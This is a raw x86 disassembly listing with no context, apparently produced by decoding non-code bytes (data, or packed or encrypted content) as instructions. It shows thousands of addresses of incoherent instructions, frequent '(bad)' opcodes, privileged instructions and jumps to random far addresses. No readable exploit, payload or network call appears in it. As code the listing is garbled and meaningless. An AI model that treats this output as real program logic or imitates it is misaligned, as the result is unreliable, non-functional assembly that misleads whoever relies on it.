  426efd:	bound  edx,QWORD PTR [ebp+0x501c2f52]
  426f03:	sbb    eax,0xc108ff31
  426f08:	jl     0x426ec1
  426f0a:	outs   dx,BYTE PTR ds:[esi]
  426f0b:	push   cs
  426f0c:	mov    ebx,0x15ea1361
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esi+ecx*8-0x2c26c74f],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	(bad)  
  426f8d:	fisttp WORD PTR [ebx+0x30296b18]
  426f93:	adc    dh,ch
  426f95:	mul    ebp
  426f97:	jl     0x426f22
  426f99:	pop    ds
  426f9a:	iret   
  426f9b:	dec    esi
  426f9c:	lds    esi,FWORD PTR [eax-0x5e44d018]
  426fa2:	lea    edi,[ebx+0x27]
  426fa5:	mov    cl,0xfe
  426fa7:	sub    dl,BYTE PTR [edx+0x49]
  426faa:	ret    
  426fab:	adc    ah,BYTE PTR [ecx+0x3dc76c0b]
  426fb1:	std    
  426fb2:	inc    edx
  426fb3:	and    ah,BYTE PTR [ecx+0xd]
  426fb6:	sbb    DWORD PTR [eax+0x6a],edi
  426fb9:	mov    ds:0x74ad2312,al
  426fbe:	mov    esp,0xeabe7422
  426fc3:	call   0x768:0x355803d
  426fca:	int3   
  426fcb:	or     DWORD PTR [edi],0x78de748
  426fd1:	push   eax
  426fd2:	adc    BYTE PTR [eax],ah
  426fd4:	rcl    BYTE PTR [ecx+0x3],cl
  426fd7:	stos   BYTE PTR es:[edi],al
  426fd8:	add    DWORD PTR [edx+0x4e803654],ebp
  426fde:	mov    eax,0x923ce877
  426fe3:	push   cs
  426fe4:	mov    ecx,0xed472da
  426fe9:	in     al,0x61
  426feb:	lock xchg esp,eax
  426fed:	ja     0x426fd1
  426fef:	mov    ?,WORD PTR [ebp+ecx*4+0x7e]
  426ff3:	pop    es
  426ff4:	cmp    bh,al
  426ff6:	fdiv   QWORD PTR [eax+0x56]
  426ff9:	jg     0x426fd5
  426ffb:	jge    0x42703f
  426ffd:	jg     0x427075
  426fff:	push   esi
  427000:	xchg   edi,eax
  427001:	hlt    
  427002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427003:	loop   0x426fa1
  427005:	enter  0xd357,0xc
  427009:	push   esi
  42700a:	xchg   ebp,eax
  42700b:	add    BYTE PTR [esi],al
  42700d:	pop    esp
  42700e:	scas   al,BYTE PTR es:[edi]
  42700f:	paddw  mm5,QWORD PTR [edi-0x28]
  427013:	fsubr  st(2),st
  427015:	push   ds
  427016:	mov    cl,0xc4
  427018:	jb     0x427060
  42701a:	jge    0x426ff0
  42701c:	data16 fisttp WORD PTR [edi+ebx*4-0x3]
  427021:	loopne 0x426fd3
  427023:	loope  0x427088
  427025:	out    dx,eax
  427026:	jne    0x42708d
  427028:	test   al,0x39
  42702a:	scas   eax,DWORD PTR es:[edi]
  42702b:	(bad)  
  42702c:	int    0x86
  42702e:	push   es
  42702f:	jo     0x426fef
  427031:	sar    DWORD PTR [ecx+0x30],cl
  427034:	push   ebx
  427035:	sbb    eax,0xc648d817
  42703a:	cmp    cl,dl
  42703c:	mov    esp,0x6639ec57
  427041:	add    DWORD PTR [edx],esi
  427043:	ins    DWORD PTR es:[edi],dx
  427044:	dec    eax
  427045:	repnz add al,0x95
  427048:	xchg   ebp,eax
  427049:	add    ah,dl
  42704b:	je     0x4270a4
  42704d:	xchg   ecx,eax
  42704e:	lahf   
  42704f:	dec    edi
  427050:	ins    DWORD PTR es:[edi],dx
  427051:	out    dx,al
  427052:	mov    ebx,DWORD PTR [esi]
  427054:	call   DWORD PTR ds:0xcbc46a60
  42705a:	retf   
  42705b:	loopne 0x427023
  42705d:	aam    0x5
  42705f:	mov    ebp,0x9d3e7e78
  427064:	fwait
  427065:	jne    0x426ff2
  427067:	shl    edi,cl
  427069:	in     eax,0xad
  42706b:	adc    BYTE PTR [edx],dh
  42706d:	jle    0x427078
  42706f:	aam    0x41
  427071:	mul    ebx
  427073:	clc    
  427074:	sbb    eax,0x8be5eaa3
  427079:	push   cs
  42707a:	dec    eax
  42707b:	in     al,dx
  42707c:	xor    al,0x14
  42707e:	fbstp  TBYTE PTR [esi]
  427080:	push   esi
  427081:	mov    ah,0x90
  427083:	ss aaa 
  427085:	nop
  427086:	and    ebx,DWORD PTR [esi+0x62]
  427089:	scas   eax,DWORD PTR es:[edi]
  42708a:	nop
  42708b:	ret    
  42708c:	jno    0x427020
  42708e:	hlt    
  42708f:	mov    eax,ds:0xdf
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x49aa9d96
  427102:	mov    cl,0xf9
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	mov    al,0x68
  42710e:	adc    esp,DWORD PTR [edi]
  427110:	nop
  427111:	(bad)  
  427112:	out    0x7e,al
  427114:	add    BYTE PTR [ecx+edi*2+0x2e],ah
  427118:	and    bl,cl
  42711a:	sti    
  42711b:	mov    esi,0x1bef07a5
  427120:	out    0x57,eax
  427122:	(bad)  
  427123:	jmp    0x4270d4
  427125:	xchg   esp,eax
  427126:	inc    edi
  427127:	cmp    dl,BYTE PTR [edi+0x16]
  42712a:	mov    eax,0x342bc695
  42712f:	dec    ecx
  427130:	xor    al,bl
  427132:	add    BYTE PTR [ebp+0x464cf445],cl
  427138:	or     bl,BYTE PTR [ebp-0x63e7ba4]
  42713e:	out    0x65,eax
  427140:	clc    
  427141:	loopne 0x4270c8
  427143:	cmc    
  427144:	inc    edi
  427145:	push   ebp
  427146:	adc    eax,0xf45143b0
  42714b:	fs jl  0x4270ea
  42714e:	mov    dl,0x8c
  427150:	xchg   edx,eax
  427151:	nop
  427152:	scas   eax,DWORD PTR es:[edi]
  427153:	jbe    0x42715e
  427155:	popf   
  427156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427157:	rcr    BYTE PTR [ecx],0x72
  42715a:	cmp    al,0xda
  42715c:	mov    ecx,DWORD PTR [ebx]
  42715e:	and    BYTE PTR [ecx],0x21
  427161:	sub    eax,0xf8d1a99
  427166:	xor    edx,esi
  427168:	sbb    esi,DWORD PTR [eax+0x30311371]
  42716e:	inc    ecx
  42716f:	icebp  
  427170:	fucom  st(2)
  427172:	push   cs
  427173:	jl     0x427184
  427175:	ins    DWORD PTR es:[edi],dx
  427176:	jnp    0x4270fd
  427178:	ficomp WORD PTR [ebx]
  42717a:	inc    ecx
  42717c:	cmp    eax,0x96123f70
  427181:	outs   dx,DWORD PTR ds:[esi]
  427182:	cmp    al,0xbd
  427184:	xor    edi,DWORD PTR [esi]
  427186:	cmp    al,bh
  427188:	fisubr DWORD PTR ds:0xe5504240
  42718e:	xlat   BYTE PTR ds:[ebx]
  42718f:	dec    edx
  427190:	pushf  
  427191:	adc    al,0x4a
  427193:	or     BYTE PTR [ebx-0x756cbe35],bl
  427199:	fld    QWORD PTR [ecx-0x58]
  42719c:	js     0x42720e
  42719e:	or     dh,BYTE PTR [ecx+edi*8]
  4271a1:	xor    ebp,ebx
  4271a3:	lods   eax,DWORD PTR ds:[esi]
  4271a4:	test   eax,0x62cd6975
  4271a9:	lea    edi,[edx]
  4271ab:	fimul  DWORD PTR [edx+0xd]
  4271ae:	mov    ecx,0xcc1bab8b
  4271b3:	or     dh,BYTE PTR [ebp+0x4]
  4271b6:	add    al,0x6a
  4271b8:	outs   dx,BYTE PTR ds:[esi]
  4271b9:	cmp    BYTE PTR [edx-0x1c],ah
  4271bc:	fst    DWORD PTR ds:0xf0e24053
  4271c2:	jb     0x4271a1
  4271c4:	in     al,dx
  4271c5:	sub    eax,0x6f0044aa
  4271ca:	adc    DWORD PTR [edi+esi*1-0x70d716cd],ebx
  4271d1:	mov    eax,0x5a12332a
  4271d6:	imul   ebp,DWORD PTR ds:[ecx-0x8],0x48
  4271db:	scas   eax,DWORD PTR es:[edi]
  4271dc:	sub    al,0xad
  4271de:	retf   
  4271df:	xor    ecx,edx
  4271e1:	xor    bh,BYTE PTR es:[edi+ecx*8+0xd]
  4271e6:	xchg   ebp,eax
  4271e7:	sub    al,0x7
  4271e9:	sub    eax,0x205d5645
  4271ee:	jp     0x427214
  4271f0:	jmp    0x427263
  4271f2:	(bad)  
  4271f3:	rep ins BYTE PTR es:[edi],dx
  4271f5:	mov    ch,0xd3
  4271f7:	add    al,0x3e
  4271f9:	and    dh,al
  4271fb:	das    
  4271fc:	pop    ds
  4271fd:	inc    esp
  4271fe:	sahf   
  4271ff:	mov    ch,0x11
  427201:	ins    DWORD PTR es:[edi],dx
  427202:	mov    cl,ch
  427204:	lea    ecx,[ecx+ecx*2-0x79]
  427208:	mov    al,ds:0x28cd74d9
  42720d:	sbb    BYTE PTR [eax+ecx*1],bh
  427210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x2750b435,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	shr    BYTE PTR [eax-0x31],1
  42728f:	fs popf 
  427291:	pop    esi
  427292:	int3   
  427293:	mov    eax,0x669e378
  427298:	or     al,0xbd
  42729a:	lea    edx,[ebp-0x3a]
  42729d:	inc    esi
  42729e:	or     bl,BYTE PTR [edi+0x31]
  4272a1:	imul   DWORD PTR [ebx]
  4272a3:	mov    edx,0x2addc2c8
  4272a8:	xchg   edx,eax
  4272a9:	jb     0x427257
  4272ab:	repz jp 0x427243
  4272ae:	out    dx,al
  4272af:	cmp    DWORD PTR [ebx],0xffffffa5
  4272b2:	sbb    BYTE PTR [ebx-0x25da7edd],bl
  4272b8:	mov    DWORD PTR [ecx],ebx
  4272ba:	stos   BYTE PTR es:[edi],al
  4272bb:	nop    DWORD PTR [edi+0x76]
  4272bf:	push   0xffffff92
  4272c1:	sar    al,1
  4272c3:	or     esi,DWORD PTR [esi+0x3]
  4272c6:	pop    edx
  4272c7:	ins    DWORD PTR es:[edi],dx
  4272c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272c9:	cmp    al,0x8
  4272cb:	xchg   ecx,eax
  4272cc:	stos   BYTE PTR es:[edi],al
  4272cd:	loop   0x42724f
  4272cf:	ss jbe 0x42730d
  4272d2:	aas    
  4272d3:	cmp    BYTE PTR [esi],ah
  4272d5:	adc    ebx,esp
  4272d7:	adc    DWORD PTR [ebx+0x52],esp
  4272da:	pop    ds
  4272db:	inc    edi
  4272dc:	fst    st(3)
  4272de:	adc    ebx,DWORD PTR [ebx]
  4272e0:	out    0xa6,al
  4272e2:	mov    eax,edi
  4272e4:	jl     0x427337
  4272e6:	or     bl,bh
  4272e8:	push   esp
  4272e9:	mov    ch,0x72
  4272eb:	test   BYTE PTR [ecx-0x1bb99e6],ah
  4272f1:	hlt    
  4272f2:	push   es
  4272f3:	or     DWORD PTR [esi-0x78125bf6],ebp
  4272f9:	sti    
  4272fa:	pop    ds
  4272fb:	jp     0x42733e
  4272fd:	in     eax,dx
  4272fe:	test   bl,ch
  427300:	pop    ebx
  427301:	cld    
  427302:	leave  
  427303:	mov    ecx,0x8fbface3
  427308:	jl     0x427334
  42730a:	jmp    0x2c3d122a
  42730f:	stos   BYTE PTR es:[edi],al
  427310:	jae    0x427378
  427312:	test   al,0xce
  427314:	in     al,dx
  427315:	jmp    0x2576:0xb017cb5a
  42731c:	(bad)  
  42731d:	mov    bl,0x83
  42731f:	xchg   ebx,eax
  427320:	jbe    0x427333
  427322:	pushf  
  427323:	cmp    al,0x1c
  427325:	mov    esi,0x4564740f
  42732a:	mov    esi,0xeeac0ff4
  42732f:	or     DWORD PTR [edi+ecx*2-0x6e],edi
  427333:	icebp  
  427334:	sub    ah,dh
  427336:	push   0x39eb732e
  42733b:	lods   eax,DWORD PTR ds:[esi]
  42733c:	bswap  edx
  42733e:	int3   
  42733f:	mov    dl,0x50
  427341:	lods   al,BYTE PTR ds:[esi]
  427342:	and    ebx,DWORD PTR [edx-0x69]
  427345:	fidivr DWORD PTR [edx-0x29]
  427348:	mov    ?,WORD PTR [eax]
  42734a:	cmp    DWORD PTR [eax-0x7561267b],esi
  427350:	and    ebp,DWORD PTR gs:[esi-0x59]
  427354:	fs jmp 0xe26:0x88f66d00
  42735c:	dec    ecx
  42735d:	push   edi
  42735e:	push   edi
  42735f:	aad    0x65
  427361:	aas    
  427362:	repz call 0x7109954a
  427368:	xchg   esp,eax
  427369:	or     BYTE PTR [esp+edx*8],0x6d
  42736d:	pusha  
  42736e:	mov    edx,0x3a3065b9
  427373:	scas   eax,DWORD PTR es:[edi]
  427374:	push   esp
  427375:	cld    
  427376:	je     0x427368
  427378:	jmp    0x42732b
  42737a:	jmp    0x42736e
  42737c:	dec    esi
  42737d:	mov    ebp,0xb6739b38
  427382:	push   ebp
  427383:	xchg   edx,eax
  427384:	(bad)  
  427386:	mov    ds:0xb4f5f3c1,eax
  42738b:	mul    BYTE PTR [esi-0x3]
  42738e:	out    dx,eax
  42738f:	(bad)  
  427390:	in     al,0x0
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebx,DWORD PTR ds:0xe2bd602e
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	inc    eax
  42740d:	pop    ds
  42740e:	dec    esp
  42740f:	stc    
  427410:	mov    BYTE PTR ds:0xf4cc2ed9,al
  427416:	xchg   DWORD PTR [edi+0x16],ebx
  427419:	popf   
  42741a:	cmp    BYTE PTR [edx-0x78b5684b],dl
  427420:	call   0xbee18510
  427425:	fnsave [edx+0x54b81025]
  42742b:	inc    edx
  42742c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42742d:	enter  0xf9b1,0x85
  427431:	out    dx,al
  427432:	addr16 inc esi
  427434:	jae    0x4273d4
  427436:	and    esi,DWORD PTR [ebp+0x27e41dd6]
  42743c:	into   
  42743d:	(bad)  
  42743f:	dec    ebp
  427440:	call   0x36d51870
  427445:	dec    edi
  427446:	mov    ebx,0x3e8e84c0
  42744b:	aas    
  42744c:	mov    ebp,0x585ab375
  427451:	mov    eax,ds:0xf062a31c
  427456:	cld    
  427457:	dec    eax
  427458:	aad    0x1a
  42745a:	out    dx,eax
  42745b:	(bad)  
  42745c:	push   esp
  42745d:	sub    eax,0x599d70f
  427462:	jecxz  0x42742b
  427464:	jo     0x427439
  427466:	mov    ebp,DWORD PTR [edx-0x30cf068d]
  42746c:	jg     0x4274d9
  42746e:	mov    esi,0x747fd47f
  427473:	mov    BYTE PTR [esp+ecx*4+0x2d],dl
  427477:	ror    BYTE PTR [ecx-0x215f3d65],cl
  42747d:	mov    al,0x67
  42747f:	loopne 0x4274b1
  427481:	jp     0x427495
  427483:	stc    
  427484:	add    ch,al
  427486:	pop    ss
  427487:	or     dl,ah
  427489:	aaa    
  42748a:	push   ebx
  42748b:	rcr    BYTE PTR fs:[edx],0x90
  42748f:	cmp    BYTE PTR [edx-0x7],ah
  427492:	popf   
  427493:	push   0x1d
  427495:	mov    ds:0xb466e562,eax
  42749a:	daa    
  42749b:	or     eax,0x4411116c
  4274a0:	cmp    al,0x3b
  4274a2:	mov    eax,ds:0x8e3ebf81
  4274a7:	hlt    
  4274a8:	neg    BYTE PTR [edi]
  4274aa:	lods   al,BYTE PTR ds:[esi]
  4274ab:	mov    eax,ds:0xf2813c53
  4274b0:	pop    es
  4274b1:	add    al,0x25
  4274b3:	sahf   
  4274b4:	push   ebx
  4274b5:	sbb    BYTE PTR [ecx],bh
  4274b7:	fisttp DWORD PTR [esi-0x20f9837d]
  4274bd:	adc    eax,0xe825c6fe
  4274c2:	lods   eax,DWORD PTR ds:[esi]
  4274c3:	jno    0x42750d
  4274c5:	cmp    ah,BYTE PTR [eax+0x2be28430]
  4274cb:	sub    eax,DWORD PTR [esi+0x558bb3]
  4274d1:	ret    0xce8b
  4274d4:	pop    ecx
  4274d5:	dec    edi
  4274d6:	adc    esp,ecx
  4274d8:	push   esi
  4274d9:	pusha  
  4274da:	out    dx,al
  4274db:	jmp    0x626be47e
  4274e0:	dec    ebx
  4274e1:	xchg   esi,eax
  4274e2:	sub    ch,ah
  4274e4:	jne    0x4274eb
  4274e6:	lock (bad) 
  4274e8:	or     DWORD PTR [eax],esi
  4274ea:	xor    DWORD PTR ds:0xf4ac213e,esi
  4274f0:	add    BYTE PTR [edx-0x66],dl
  4274f3:	leave  
  4274f4:	sti    
  4274f5:	in     al,0x48
  4274f7:	push   ecx
  4274f8:	push   cs
  4274f9:	add    ch,BYTE PTR [edi-0x6cd42fce]
  4274ff:	pop    ebp
  427500:	dec    edi
  427501:	jp     0x4274a1
  427503:	stc    
  427504:	sbb    ebx,edi
  427506:	gs retf 0x884
  42750a:	les    ebp,FWORD PTR [ebx-0x1513c279]
  427510:	lock add BYTE PTR [eax],al
	...
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	pushf  
  427581:	out    0xa8,al
  427583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427584:	out    0xa4,eax
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0x90000001
  42758d:	arpl   WORD PTR [edx+eiz*2],ax
  427590:	push   es
  427591:	aaa    
  427592:	or     DWORD PTR [ecx+ebp*1-0x25],0xc1d7ec2e
  42759a:	sbb    eax,0xd7019664
  42759f:	test   DWORD PTR [edx-0x40af3827],esi
  4275a5:	lds    eax,FWORD PTR [ecx+ebx*8]
  4275a8:	lods   al,BYTE PTR ds:[esi]
  4275a9:	cmp    al,0x92
  4275ab:	test   eax,0xf7c0ec0
  4275b0:	ds sahf 
  4275b2:	setns  ch
  4275b5:	std    
  4275b6:	cmp    eax,0xa5c3c9fe
  4275bb:	cld    
  4275bc:	jg     0x427580
  4275be:	jg     0x4275d2
  4275c0:	cmp    BYTE PTR [edx],dl
  4275c2:	aas    
  4275c3:	mov    ?,WORD PTR [ebx+0x4f]
  4275c6:	in     eax,dx
  4275c7:	xchg   ebx,eax
  4275c8:	(bad)  
  4275ca:	pop    es
  4275cb:	mov    esp,0x1ea22610
  4275d0:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4275d2:	dec    ebp
  4275d3:	mov    ?,WORD PTR [edi-0xc]
  4275d6:	mov    ebp,0xd989ba6b
  4275db:	and    esp,edx
  4275dd:	sbb    esp,DWORD PTR [eax-0x44]
  4275e0:	adc    ch,BYTE PTR [esi-0x49d80d3b]
  4275e6:	and    eax,0x60f43371
  4275eb:	cli    
  4275ec:	jg     0x427625
  4275ee:	jo     0x4275e2
  4275f0:	xor    eax,0x6bd58f97
  4275f5:	cmp    eax,0x3dda1658
  4275fa:	ret    0xb875
  4275fd:	popf   
  4275fe:	push   ebp
  4275ff:	mov    ah,0xd7
  427601:	arpl   ax,si
  427603:	enter  0xef5,0x41
  427607:	dec    ebp
  427608:	xor    eax,ebp
  42760a:	hlt    
  42760b:	adc    BYTE PTR [edi-0x29],ah
  42760e:	jo     0x427672
  427610:	(bad)  [esp+edx*2+0x4]
  427615:	or     BYTE PTR cs:[esi+0x37],al
  427619:	loope  0x4275e3
  42761b:	dec    ecx
  42761c:	aad    0xbc
  42761e:	adc    al,0x1b
  427620:	mov    bl,0x56
  427622:	pop    edx
  427623:	lock int3 
  427625:	mov    bh,0x6a
  427627:	push   0x52
  427629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42762a:	mov    dh,0xfa
  42762c:	les    ebx,FWORD PTR ds:0xc16c19ab
  427632:	sbb    BYTE PTR [ebx],al
  427634:	leave  
  427635:	addr16 sbb al,0x9
  427638:	or     al,0x72
  42763a:	push   ebp
  42763b:	mov    al,0x46
  42763d:	fidiv  WORD PTR ds:0x6ee78eff
  427643:	mov    edi,0xd40006b3
  427648:	test   BYTE PTR [ebx],0xa9
  42764b:	mov    ah,0xc3
  42764d:	jno    0x427634
  42764f:	inc    esp
  427650:	(bad)  
  427651:	adc    al,0x8c
  427653:	icebp  
  427654:	cdq    
  427655:	and    edi,DWORD PTR [edi+0x43]
  427658:	das    
  427659:	or     BYTE PTR [eax+0x6a],bl
  42765c:	jae    0x427653
  42765e:	adc    ch,BYTE PTR [eax+0x38]
  427661:	das    
  427662:	jle    0x4276b7
  427664:	int    0x53
  427666:	out    0xa6,al
  427668:	inc    edi
  427669:	xchg   ebp,eax
  42766a:	jae    0x42769e
  42766c:	jb     0x4275f6
  42766e:	lea    eax,[esi+0x5f8e3ca5]
  427674:	add    al,0x76
  427676:	jbe    0x427611
  427678:	jae    0x4276f3
  42767a:	arpl   WORD PTR [edi+0x13],ax
  42767d:	cmp    DWORD PTR [eax],edi
  42767f:	cli    
  427680:	inc    ecx
  427681:	inc    eax
  427682:	add    ch,BYTE PTR [esi-0x21]
  427685:	inc    eax
  427686:	pop    ebp
  427687:	mov    ds:0xb091487,al
  42768c:	call   0xc13a4f84
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstcw WORD PTR ds:0xecdf9966
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x1
  42770d:	xor    bl,BYTE PTR [ebp+esi*1-0x4b79eec4]
  427714:	loop   0x427708
  427716:	xlat   BYTE PTR ds:[ebx]
  427717:	pop    edi
  427718:	mov    BYTE PTR [edi],dl
  42771a:	in     eax,dx
  42771b:	add    cl,BYTE PTR [ecx+0x1351b1fa]
  427721:	(bad)  
  427722:	jne    0x427760
  427724:	or     BYTE PTR [edi],bh
  427726:	out    0x98,eax
  427728:	mov    eax,ds:0x81f4771b
  42772d:	jge    0x427740
  42772f:	test   eax,0x37d84baa
  427734:	fwait
  427735:	mov    dl,0x7e
  427737:	fucom  st(3)
  427739:	pushf  
  42773a:	xor    BYTE PTR [eax+0x21],al
  42773d:	mov    ch,0xeb
  42773f:	pop    ss
  427740:	sbb    al,0xfc
  427742:	jne    0x42770a
  427744:	pusha  
  427745:	loop   0x4276dc
  427747:	fdiv   QWORD PTR [edi]
  427749:	cwde   
  42774a:	call   0xf4f0bac9
  42774f:	cdq    
  427750:	scas   al,BYTE PTR es:[edi]
  427751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427752:	shr    BYTE PTR [edx],1
  427754:	(bad)  
  427755:	int    0x59
  427757:	pop    eax
  427758:	add    eax,0x3f94262a
  42775d:	pop    edx
  42775e:	mov    esp,0xcac8f62b
  427763:	xor    BYTE PTR [edx-0x3d283edc],dl
  427769:	push   0x241b4fc4
  42776e:	test   BYTE PTR [bx+si],dl
  427771:	xor    BYTE PTR [ebp+0x2f10c488],bh
  427777:	add    BYTE PTR [ebx+0x7c],0xe8
  42777b:	sbb    DWORD PTR [eax],edx
  42777d:	sub    esp,DWORD PTR [ebp-0x52fb2b33]
  427783:	jno    0x427763
  427785:	stc    
  427786:	adc    al,0xd7
  427788:	cli    
  427789:	fsubr  st(2),st
  42778b:	sahf   
  42778c:	pusha  
  42778d:	pop    edi
  42778e:	and    BYTE PTR [edi-0xa],bl
  427791:	cmp    al,0x1f
  427793:	pop    es
  427794:	aaa    
  427795:	sar    DWORD PTR [ecx],1
  427797:	sub    edi,DWORD PTR [edi+0x42]
  42779a:	das    
  42779b:	mov    ah,0x6d
  42779d:	cmp    DWORD PTR [esi-0x54f5825c],0xbe9bd83e
  4277a7:	mov    dl,ch
  4277a9:	mov    ebx,ebp
  4277ab:	aas    
  4277ac:	xchg   edi,eax
  4277ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277ae:	lods   al,BYTE PTR ds:[esi]
  4277af:	xor    dh,0xb1
  4277b2:	int    0xea
  4277b4:	ins    BYTE PTR es:[edi],dx
  4277b5:	xchg   ecx,eax
  4277b6:	loope  0x427802
  4277b8:	sub    dl,BYTE PTR [ecx+0x53]
  4277bb:	enter  0xd5d,0x91
  4277bf:	jbe    0x4277d5
  4277c1:	xchg   esi,eax
  4277c2:	(bad)  
  4277c3:	icebp  
  4277c4:	mov    dl,0xa3
  4277c6:	lsl    edi,WORD PTR ds:0x34159e48
  4277cd:	xchg   edx,eax
  4277ce:	push   0xffffffae
  4277d0:	cmp    esp,DWORD PTR [edi+0x248679a7]
  4277d6:	fist   DWORD PTR [eax-0x37a3fe7c]
  4277dc:	imul   edx,edi,0xffffff9d
  4277df:	pop    ebx
  4277e0:	xor    eax,0x41361a26
  4277e5:	rdmsr  
  4277e7:	shr    cl,0xef
  4277ea:	getsec 
  4277ec:	(bad)  
  4277ee:	sbb    bh,BYTE PTR [ebx]
  4277f0:	call   0x118d:0xed714d1f
  4277f7:	inc    edx
  4277f8:	les    esp,FWORD PTR [edi]
  4277fa:	sub    eax,0x298915ba
  4277ff:	mov    cl,0xe
  427801:	push   ebp
  427802:	(bad)  
  427803:	repnz dec esp
  427805:	imul   edi,esi,0x5c5e8f26
  42780b:	mov    eax,0x108dae5b
  427810:	adc    al,BYTE PTR [eax]
	...
  427872:	add    BYTE PTR [eax],al
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	cdq    
  427881:	shl    DWORD PTR [edx+0x1a6f14f],1
  427887:	add    BYTE PTR ds:0x28000001,al
  42788d:	aaa    
  42788e:	jl     0x427869
  427890:	mov    dh,0xdd
  427892:	(bad)  
  427893:	js     0x4278ab
  427895:	int    0x8e
  427897:	inc    ecx
  427898:	pop    ds
  427899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42789a:	add    al,0x72
  42789c:	push   edx
  42789d:	outs   dx,BYTE PTR ds:[esi]
  42789e:	and    ecx,DWORD PTR [edi+0x34]
  4278a1:	inc    esp
  4278a2:	repnz inc eax
  4278a4:	sahf   
  4278a5:	xor    al,0xa1
  4278a7:	cdq    
  4278a8:	xchg   edx,eax
  4278a9:	in     eax,dx
  4278aa:	jbe    0x427852
  4278ac:	xchg   esp,eax
  4278ad:	nop
  4278ae:	in     eax,0x65
  4278b0:	push   ecx
  4278b1:	add    esp,DWORD PTR [esi]
  4278b3:	sbb    ebp,0x49
  4278b6:	xor    al,0x5d
  4278b8:	cdq    
  4278b9:	scas   al,BYTE PTR es:[edi]
  4278ba:	(bad)  
  4278bb:	test   BYTE PTR gs:[ecx+0x2cf189ab],bh
  4278c2:	pop    esi
  4278c3:	inc    ebp
  4278c4:	xor    eax,0xdda79529
  4278c9:	sbb    DWORD PTR [ebp+0x63],0xffffffeb
  4278cd:	mov    ecx,0xd580884b
  4278d2:	ret    
  4278d3:	sbb    eax,0x463baace
  4278d8:	mov    cl,0xf9
  4278da:	mov    edx,0x74441b35
  4278df:	push   ebp
  4278e0:	push   0x4313324d
  4278e5:	inc    esi
  4278e6:	fwait
  4278e7:	mov    dl,bl
  4278e9:	push   ss
  4278ea:	in     al,dx
  4278eb:	mov    ebp,DWORD PTR [ebx+0x4]
  4278ee:	sbb    eax,0x8426792f
  4278f3:	ins    BYTE PTR es:[edi],dx
  4278f4:	stos   DWORD PTR es:[edi],eax
  4278f5:	cmp    BYTE PTR [esi-0x6858b26e],0x4f
  4278fc:	inc    DWORD PTR [esi+esi*8+0x3333e75]
  427903:	mov    esi,0x11e8bb5e
  427908:	cmp    bl,BYTE PTR [eax]
  42790a:	in     eax,dx
  42790b:	mov    dh,0x2a
  42790d:	mov    ds:0xfc6dab04,al
  427912:	jmp    0x8d7307e6
  427917:	ret    
  427918:	push   ebp
  427919:	inc    ebp
  42791a:	repz mov esi,0x7ef038b9
  427920:	sahf   
  427921:	stc    
  427922:	setp   BYTE PTR [ecx+0x58]
  427926:	sub    ebp,ecx
  427928:	cmc    
  427929:	jno    0x4278f8
  42792b:	and    eax,0xf8cca1
  427930:	jne    0x4279a3
  427932:	int3   
  427933:	es dec edx
  427935:	mov    edx,0x7f45a10b
  42793a:	dec    ebx
  42793b:	adc    al,0x36
  42793d:	mov    edx,es
  42793f:	in     al,0x2e
  427941:	lahf   
  427942:	cmp    BYTE PTR [ebx],al
  427944:	popf   
  427945:	jb     0x4278f0
  427947:	ror    BYTE PTR [edx-0x2573d711],cl
  42794d:	mov    ecx,0x2160b5ca
  427952:	test   BYTE PTR [esi-0x4a],bh
  427955:	in     al,dx
  427956:	mov    ds:0xaf77e3fe,al
  42795b:	hlt    
  42795c:	gs push ebp
  42795e:	add    ebx,esp
  427960:	jnp    0x427928
  427962:	mov    al,0xfd
  427964:	or     al,BYTE PTR [edx]
  427966:	pop    ebp
  427967:	mov    eax,ds:0x5cba4143
  42796c:	mov    WORD PTR [edi-0x4d24c687],?
  427972:	mov    ebx,0x32afc1bd
